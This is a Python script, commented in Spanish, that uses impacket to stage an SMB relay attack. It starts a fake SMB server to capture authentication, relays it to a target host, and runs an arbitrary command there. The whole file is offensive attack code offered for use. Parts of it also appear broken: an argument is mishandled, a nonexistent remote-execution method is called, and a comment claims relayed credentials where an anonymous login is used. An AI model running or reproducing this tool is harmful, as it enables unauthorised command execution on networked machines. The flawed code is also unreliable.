#!/usr/bin/env python3
#_*_ coding: utf8 _*_

import os
import sys
import logging
from impacket import smbserver
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.utils import getGlobalSettings
from impacket.smbconnection import SMBConnection

# Verificar y relanzar con sudo si es necesario
def check_sudo():
    if os.geteuid() != 0:
        print("[S] Este script necesita permisos de superusuario. Relanzando con sudo...")
        args = ['sudo', sys.executable] + sys.argv
        os.execvpe('sudo', args, os.environ)

check_sudo()

# Configurar el nivel de registro
logging.basicConfig(level=logging.INFO)

# Configurar el servidor SMB falso para capturar las solicitudes SMB
def start_smb_server():
    server = smbserver.SimpleSMBServer()
    server.setSMB2Support(True)  # Habilitar soporte para SMB2
    server.addShare("SHARE", "/tmp")  # Compartir un directorio temporal
    server.setLogFile('/tmp/smb.log')
    server.start()

# Configurar el relé SMB
def start_smb_relay(target, command):
    targetsProcessor = TargetsProcessor(singleTarget=target)
    globalSettings = getGlobalSettings()
    server = CustomSMBRelayServer(targetsProcessor, globalSettings, command)
    server.start()

class CustomSMBRelayServer(SMBRelayServer):
    def __init__(self, *args, **kwargs):
        self.command = kwargs.pop('command')
        super().__init__(*args, **kwargs)

    def handleData(self, *args, **kwargs):
        super().handleData(*args, **kwargs)
        self.execute_remote_command()

    def execute_remote_command(self):
        target_ip = self.target
        smb_connection = SMBConnection(target_ip, target_ip)
        smb_connection.login('', '')  # Usa las credenciales obtenidas por el relay
        try:
            # Ejecutar el comando
            smb_connection.executeRemote(self.command)
            logging.info(f'Comando ejecutado en {target_ip}: {self.command}')
        except Exception as e:
            logging.error(f'Error ejecutando el comando: {e}')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 smb_relay.py <IP_DE_DESTINO> <COMANDO>")
        sys.exit(1)

    target_ip = sys.argv[1]
    command = sys.argv[2]

    try:
        # Iniciar el servidor SMB falso
        start_smb_server()
        # Iniciar el relé SMB con el comando especificado
        start_smb_relay(target_ip, command)
    except KeyboardInterrupt:
        print("Interrumpido por el usuario")
    except Exception as e:
        print(f"Error: {e}")
